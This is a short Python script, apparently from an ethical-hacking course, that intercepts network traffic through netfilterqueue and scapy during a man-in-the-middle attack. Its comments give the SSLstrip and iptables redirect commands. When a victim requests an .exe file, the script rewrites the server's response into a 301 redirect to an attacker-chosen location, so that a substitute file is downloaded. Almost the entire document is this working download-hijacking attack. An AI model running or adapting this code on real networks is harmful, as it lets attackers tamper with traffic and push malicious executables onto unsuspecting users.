#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 10000: #while using SSLstrip we set the port to 10000
            #iptables command when using SSLstrip >> iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
            # while using the above rules the FORWARD chain does not work so use the INPUT and OUTPUT chain instead >> iptables -I INPUT/OUTPUT -j NFQUEUE --queue-num 0
             #print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 10000:
             #print("HTTTP Response")
            if scapy_packet[scapy.TCP].seq  in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\n\nLocation: http://www.example.org/index.asp\n\n")
                # we use \n\n after the location field to remove any other gibberish string or character automatically appended by the original
                # packet so that the link provided by us stays intact and works properly.

                packet.set_payload(str(modified_packet))


    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()